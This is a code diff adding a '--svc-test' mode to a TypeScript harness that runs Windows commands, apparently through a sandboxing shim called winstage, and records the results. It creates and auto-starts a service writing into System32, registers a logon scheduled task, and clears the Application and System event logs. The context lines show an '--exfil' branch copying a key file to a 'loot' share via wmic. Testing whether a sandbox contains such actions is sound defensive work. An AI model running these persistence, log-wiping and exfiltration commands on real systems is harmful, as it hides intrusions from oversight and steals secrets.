@@ -301,6 +301,46 @@ async function main() {
       save()
       return
     }
+    if (process.argv.includes('--svc-test')) {
+      const step = async (label: string, line: string) => {
+        const r = await runShell(line, 120000)
+        transcript.steps.push({ smoke: label, line, result: r })
+        save()
+        await new Promise((r2) => setTimeout(r2, 1500))
+      }
+      await step('sc-rc', 'sc query AJRouter & echo RC=%ERRORLEVEL%')
+      await step('probe-inj', 'C:\\winstage-plugin\\shim\\out\\winstage-inject.exe --dll C:\\winstage-plugin\\shim\\out\\winstage-shim.dll --set-env DSH_STAGE_ROOT=C:\\rt\\stage\\staged --set-env DSH_SHIM_CONFIG=C:\\rt\\stage\\staged\\winstage-shim.config.json --set-env DSH_REGSTAGE_SESSION_DIR=C:\\rt\\stage --cwd C:\\rt\\stage\\staged -- C:\\winstage-plugin\\shim\\out\\winstage-probe.exe --sc query AJRouter & echo RC=%ERRORLEVEL%')
+      await step('sc-create', 'sc create WinstageTestSvc binPath= "C:\\Windows\\System32\\cmd.exe /c echo svc-ran > C:\\Windows\\System32\\svc_real.txt" start= demand')
+      await step('sc-qc', 'sc qc WinstageTestSvc')
+      await step('sc-config', 'sc config WinstageTestSvc start= auto displayname= "WinStage Staged Svc"')
+      await step('sc-qc2', 'sc qc WinstageTestSvc')
+      await step('sc-start', 'sc start WinstageTestSvc')
+      await step('sc-query', 'sc query WinstageTestSvc')
+      await step('sc-stop', 'sc stop WinstageTestSvc')
+      await step('sc-query2', 'sc query WinstageTestSvc')
+      await step('sc-enum', 'sc query type= service state= all')
+      await step('task-create', 'schtasks /create /tn RTStageTask /tr "C:\\Windows\\System32\\calc.exe" /sc onlogon /f')
+      await step('task-query', 'schtasks /query /tn RTStageTask')
+      await step('task-run', 'schtasks /run /tn RTStageTask')
+      await step('task-delete', 'schtasks /delete /tn RTStageTask /f')
+      await step('task-query2', 'schtasks /query /tn RTStageTask')
+      const svcRealFile = existsSync('C:\\Windows\\System32\\svc_real.txt')
+      let serviceJournal = ''
+      try { serviceJournal = readFileSync(STORE + '\\service.overlay.jsonl', 'utf8').slice(-4000) } catch {}
+      await step('evt-seed', 'eventcreate /t information /id 100 /l APPLICATION /d "winstage-evt-marker"')
+      await step('evt-before', 'wevtutil qe Application /c:1 /f:text')
+      await step('evt-clear', 'wevtutil cl Application')
+      await step('evt-after', 'wevtutil qe Application /c:1 /f:text')
+      await step('evt-legacy-clear', 'powershell -NoProfile -Command "Clear-EventLog -LogName System"')
+      await step('evt-legacy-query', 'wevtutil qe System /c:1 /f:text')
+      let evtJournal = ''
+      try { evtJournal = readFileSync(STORE + '\\eventlog.overlay.jsonl', 'utf8').slice(-2000) } catch {}
+      await step('sc-delete', 'sc delete WinstageTestSvc')
+      await step('sc-query-after-delete', 'sc query WinstageTestSvc')
+      transcript.steps.push({ smoke: 'svc-result', svcRealFile, serviceJournal, evtJournal })
+      save()
+      return
+    }
     const cmds = process.argv.includes('--exfil') ? [
       'wmic process call create "cmd.exe /c copy /y C:\\rt\\key.txt \\\\host.lan\\Data\\rt\\loot\\wmi_key.txt"',
       'ping -n 5 127.0.0.1 >nul',
